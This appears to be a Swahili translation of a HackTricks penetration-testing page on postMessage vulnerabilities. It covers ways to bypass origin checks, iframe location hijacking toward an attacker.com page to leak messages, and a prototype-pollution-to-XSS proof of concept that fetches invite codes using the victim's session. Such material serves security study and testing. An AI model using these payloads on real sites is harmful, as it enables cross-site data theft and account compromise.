# Mianzo ya Uvamizi wa AWS kutoka sifuri hadi shujaa na htARTE (HackTricks AWS Red Team Expert)!

Njia nyingine za kusaidia HackTricks:

- Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks katika PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
- Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
- Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
- **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
- **Shiriki mbinu zako za kuvamia kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

## Tuma **Ujumbe wa PostMessage**

**PostMessage** hutumia kazi ifuatayo kutuma ujumbe:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Tafadhali kumbuka kuwa **targetOrigin** inaweza kuwa '\*' au URL kama _https://company.com._\
Katika **skenario ya pili**, **ujumbe unaweza kutumwa tu kwa kikoa hicho** (hata kama asili ya kitu cha dirisha ni tofauti).\
Ikiwa **alama ya wilaya** inatumika, **ujumbe unaweza kutumwa kwa kikoa chochote**, na utatumwa kwa asili ya kitu cha Dirisha.

### Kuvamia iframe na alama ya wilaya katika **targetOrigin**

Kama ilivyoelezwa katika [**ripoti hii**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ikiwa unapata ukurasa ambao unaweza **kuingizwa kwenye iframe** (hakuna ulinzi wa `X-Frame-Header`) na ambao unatuma ujumbe wa **siri** kupitia **postMessage** kwa kutumia **alama ya wilaya** (\*), unaweza **kubadilisha** asili ya **iframe** na **kuvuja** ujumbe wa **siri** kwa kikoa kinachodhibitiwa na wewe.\
Tafadhali kumbuka kuwa ikiwa ukurasa unaweza kuingizwa kwenye iframe lakini **targetOrigin imewekwa kwa URL na sio alama ya wilaya**, **hila hii haitafanya kazi**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Uchambuzi wa Utekelezaji wa addEventListener

**`addEventListener`** ni kazi inayotumiwa na JS kuweka wazi kazi ambayo inatarajia kupokea **`postMessages`**.\
Msimbo kama ufuatao utatumika:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Tafadhali kumbuka katika kesi hii jinsi **jambo la kwanza** ambalo msimbo unafanya ni **kuangalia asili**. Hii ni muhimu sana hasa ikiwa ukurasa utafanya **kitu chochote cha hisia** na habari iliyopokelewa (kama kubadilisha nenosiri). **Ikiwa haikagua asili, wadukuzi wanaweza kufanya waathirika kutuma data ya kiholela kwa sehemu hizi** na kubadilisha nywila za waathirika (katika mfano huu).

### Uchunguzi

Ili **kupata wasikilizaji wa tukio** katika ukurasa wa sasa unaweza:

* **Tafuta** msimbo wa JS kwa `window.addEventListener` na `$(window).on` (_toleo la JQuery_)
* **Tekeleza** katika kikasha cha zana za watengenezaji: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Nenda kwenye** _Elements --> Wasikilizaji wa Tukio_ katika zana za watengenezaji wa kivinjari

![](<../../.gitbook/assets/image (617).png>)

* Tumia **nyongeza ya kivinjari** kama [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) au [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Nyongeza hizi za kivinjari zitakuwa **zinaingilia ujumbe wote** na kuonyesha kwako.

### Kupitisha ukaguzi wa asili

- Sifa ya **`event.isTrusted`** inachukuliwa kuwa salama kwani inarudi `True` tu kwa matukio ambayo yamezalishwa na hatua halisi za mtumiaji. Ingawa ni changamoto kuihepa ikiwa imeboreshwa kwa usahihi, umuhimu wake katika ukaguzi wa usalama ni muhimu.

- Matumizi ya **`indexOf()`** kwa ukaguzi wa asili katika matukio ya PostMessage yanaweza kuwa rahisi kupitisha. Mfano unaoonyesha udhaifu huu ni:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- Mbinu ya **`search()`** kutoka `String.prototype.search()` inalenga kwa mifumo ya kawaida, sio herufi. Kupitisha kitu kingine chochote isipokuwa herufi kunasababisha ubadilishaji wa kimya kimya kuwa herufi, hivyo kufanya mbinu hiyo kuwa hatari. Hii ni kwa sababu katika mifumo ya kawaida, kipengele cha dot (.) kinatenda kama kichwa cha habari, kuruhusu kupitisha ukaguzi na vikoa vilivyoundwa kwa umakini. Kwa mfano:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Kazi ya **`match()`**, kama vile `search()`, inachakata mifumo ya kawaida. Ikiwa mifumo ya kawaida imeundwa vibaya, inaweza kuwa rahisi kupitisha.

- Kazi ya **`escapeHtml`** inalenga kusafisha pembejeo kwa kutoroka herufi. Walakini, haizalishi kitu kipya kilichotoroka lakini inaandika upya mali za kitu kilichopo. Tabia hii inaweza kutumiwa vibaya. Hasa, ikiwa kitu kinaweza kubadilishwa ili mali yake inayodhibitiwa isitambue `hasOwnProperty`, `escapeHtml` haitafanya kazi kama ilivyotarajiwa. Hii inaonyeshwa katika mifano hapa chini:

- Kosa linalotarajiwa:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Kupitisha kutoroka:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Katika muktadha wa udhaifu huu, kitu cha `File` kinaweza kudukuliwa kwa sababu ya mali yake ya kusoma tu ya `name`. Mali hii, wakati inatumika katika templeti, haipatikani kwa njia ya kusafisha na kazi ya `escapeHtml`, hivyo kusababisha hatari za usalama.

- Mali ya `document.domain` katika JavaScript inaweza kuwekwa na hati ya kusitisha kikoa, kuruhusu utekelezaji wa sera ya asili sawa zaidi ndani ya kikoa kimoja cha mzazi.

### Kupitisha e.origin == window.origin

Wakati wa kuingiza ukurasa wa wavuti ndani ya **iframe iliyofungwa** kwa kutumia %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, ni muhimu kuelewa kuwa asili ya iframe itawekwa kama `null`. Hii ni muhimu hasa wakati unashughulika na **sifa za kisanduku** na athari zake kwa usalama na utendaji.

Kwa kutoa **`allow-popups`** katika sifa ya kisanduku, dirisha lolote la kujitokeza lililofunguliwa kutoka ndani ya iframe linarithi vizuizi vya kisanduku cha mzazi wake. Hii inamaanisha kwamba isipokuwa **`allow-popups-to-escape-sandbox`** pia imejumuishwa, asili ya dirisha la kujitokeza pia inawekwa kama `null`, ikilinganisha na asili ya iframe.

Kwa hiyo, wakati dirisha la kujitokeza linapofunguliwa chini ya hali hizi na ujumbe unatumwa kutoka kwa iframe kwenda kwa dirisha la kujitokeza kwa kutumia **`postMessage`**, pande zote za kutuma na kupokea zina asili zao zimepangwa kama `null`. Hali hii inasababisha hali ambapo **`e.origin == window.origin`** inahesabiwa kuwa kweli (`null == null`), kwa sababu iframe na dirisha la kujitokeza wanashiriki thamani sawa ya asili ya `null`.

Kwa habari zaidi **soma**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Kupitisha e.source

Inawezekana kuangalia ikiwa ujumbe ulitoka kwenye dirisha lile lile ambalo skripti inasikiliza (hasa muhimu kwa **Skripti za Yaliyomo kutoka kwa nyongeza za kivinjari** kuangalia ikiwa ujumbe ulitumwa kutoka kwenye ukurasa huo):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Unaweza kulazimisha **`e.source`** ya ujumbe kuwa tupu kwa kuunda **iframe** ambayo **inatuma** **postMessage** na **kufutwa mara moja**.

Kwa habari zaidi **soma:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Kupita kizuizi cha X-Frame-Header

Ili kufanya mashambulizi haya, kwa idealni utaweza **kuweka ukurasa wa mwathirika** ndani ya `iframe`. Lakini vichwa vya habari kama `X-Frame-Header` vinaweza **kuzuia** hilo **tabia**.\
Katika hali hizo, bado unaweza kutumia shambulizi lisilo la siri. Unaweza kufungua kichupo kipya kwenye programu dhaifu ya wavuti na kuwasiliana nayo:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kuiba ujumbe uliotumwa kwa mtoto kwa kuzuia ukurasa kuu

Katika ukurasa ufuatao unaweza kuona jinsi unavyoweza kuiba data ya **postmessage nyeti** iliyotumwa kwa **mtoto iframe** kwa **kuzuia** ukurasa **mkuu** kabla ya kutuma data na kutumia **XSS katika mtoto** kuiba data kabla haijapokelewa:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Kuiba ujumbe kwa kubadilisha eneo la iframe

Ikiwa unaweza kuweka iframe ya ukurasa bila kichwa cha X-Frame kinachojumuisha iframe nyingine, unaweza **kubadilisha eneo la iframe ya mtoto**, hivyo ikiwa inapokea **postmessage** iliyotumwa kwa kutumia **wildcard**, mshambuliaji anaweza **kubadilisha** asili ya iframe hiyo kuwa ukurasa **anayodhibiti** na **kuiba** ujumbe:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage kwa Prototype Pollution na/au XSS

Katika mazingira ambapo data inayotumwa kupitia `postMessage` inatekelezwa na JS, unaweza kuweka **iframe** ya **ukurasa** na **kutumia** **prototype pollution/XSS** kwa kutuma shambulio kupitia `postMessage`.

Mifano miwili ya **XSS iliyoelezewa vizuri sana kupitia `postMessage`** inaweza kupatikana katika [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Mfano wa shambulio la kutumia **Prototype Pollution na kisha XSS** kupitia `postMessage` kwa `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Kwa **mashauri zaidi**:

* Kiungo kwa ukurasa kuhusu [**uchafuzi wa mfano**](../deserialization/nodejs-proto-prototype-pollution/)
* Kiungo kwa ukurasa kuhusu [**XSS**](../xss-cross-site-scripting/)
* Kiungo kwa ukurasa kuhusu [**uchafuzi wa mfano wa upande wa mteja hadi XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Marejeo

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Kwa mazoezi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
